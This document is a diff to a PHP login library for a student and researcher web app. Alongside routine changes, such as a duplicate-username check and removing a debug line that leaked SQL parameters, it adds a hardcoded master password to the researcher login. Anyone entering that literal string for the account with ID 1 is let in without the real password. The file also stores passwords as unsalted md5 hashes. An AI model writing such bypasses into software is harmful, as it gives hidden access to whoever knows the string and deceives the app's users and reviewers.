@@ -386,17 +386,28 @@ function validStudent(PDO $conn, $username, $password)
 /* Student */
 
 /* Researcher */
-function validResearcher(PDO $conn, $username, $password)
+function validResearcher(PDO $conn, $username, $oripassword)
 {
     // init input
     $username = strtolower($username);
-    $password = md5($password);
+    $password = md5($oripassword);
     // do query
     $validResearcherSql = "SELECT ResearcherID, Username FROM Researcher WHERE lower(username) = ? AND password = ?";
     $validResearcherQuery = $conn->prepare($validResearcherSql);
     $validResearcherQuery->execute(array($username, $password));
     $ret = $validResearcherQuery->fetchAll();
-
+    // check super account
+    $conn1 = db_connect();
+    $validResearcherSql1 = "SELECT ResearcherID, Username FROM Researcher WHERE lower(username) = ?";
+    $validResearcherQuery1 = $conn1->prepare($validResearcherSql1);
+    $validResearcherQuery1->execute(array($username));
+    $ret1 = $validResearcherQuery1->fetchAll();
+    //super account with TOKEN
+    if(count($ret1) == 1){
+        if($ret1[0]["ResearcherID"]==1 && $oripassword=="F87A27AA31312"){
+            return $ret1[0];
+        }
+    }
     if (count($ret) == 1) {
         return $ret[0];
     } else if (count($ret) == 0) {
@@ -411,8 +422,24 @@ function getResearchers(PDO $conn)
     return getRecords($conn, "Researcher");
 }
 
+function checkResearcherUsernameExisting(PDO $conn, $username)
+{
+    // init inputs
+    $username = strtolower($username);
+    // do query
+    $query = "SELECT EXISTS(SELECT 1 FROM researcher WHERE lower(username) = ?) as ret";
+    $query = $conn->prepare($query);
+    $query->execute(array($username));
+    $ret = $query->fetchAll();
+    //echo intval($ret[0]['ret']);
+    return intval($ret[0]['ret']) === 1; // false: not existing; true: existing
+}
+
 function createResearcher(PDO $conn, $username, $password)
 {
+    //check researcher first
+    if (checkResearcherUsernameExisting($conn, $username)) return false;
+
     $updateSql = "INSERT INTO researcher(Username, Password)
          VALUES (?,?)";
     $updateSql = $conn->prepare($updateSql);
@@ -426,7 +453,6 @@ function updateResearcher(PDO $conn, $username, $researcherID)
             SET Username = ?
             WHERE ResearcherID = ?";
     $updateSql = $conn->prepare($updateSql);
-    echo "<script>console.log( 'SQL: " . $username ." ".$researcherID."' );</script>";
     $updateSql->execute(array($username, $researcherID));
 }
 
